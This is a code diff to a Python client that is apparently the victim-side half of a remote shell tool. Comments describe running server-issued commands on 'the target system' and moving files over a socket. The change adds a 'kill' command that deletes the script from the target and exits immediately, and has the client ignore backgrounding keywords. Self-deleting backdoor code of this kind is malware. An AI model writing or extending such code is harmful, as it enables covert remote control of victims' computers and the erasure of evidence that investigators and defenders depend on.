@@ -2,6 +2,7 @@
 
 import socket
 import os
+import sys
 import pathlib
 import hashlib
 import time
@@ -18,7 +19,7 @@ TIMEOUT = 1  # Socket timeout when downloading / uploading files
 COOLDOWN = (1, 1)  # Range of time to sleep between consecutive connection attempts (In seconds)
 HIBERNATE = (1, 1)  # Range of time to hibernate after reaching maximum retries / Identifying a used port
 COMMAND_TIMEOUT = 10  # Time limit for command execution on the client side
-DOWNLOADS = pathlib.Path(__file__).parent
+DOWNLOADS = pathlib.Path(__file__).parent  # Downloaded files destination path
 
 
 def get_file_hash(data: list[bytes]) -> str:
@@ -210,7 +211,10 @@ def shell(sock: socket.socket) -> None:
         if msg_from_server in ["quit", "exit"]:  # Server side connection termination signal
             sock.close()
             break
-        elif msg_from_server == "clear":  # Server side console clear screen (Ignored on client side)
+        if msg_from_server == "kill":  # Server side activity termination signal
+            os.remove(sys.argv[0])  # Delete client side script from the target system
+            os._exit(0)  # Exit immediately (Do not resolve 'finally' statements)
+        elif msg_from_server in ["clear", "bg", "background"]:  # Ignore certain server side keywords
             pass
         elif msg_from_server[:9] == "download ":  # Server side file download signal
             upload_file(sock, msg_from_server[9:])
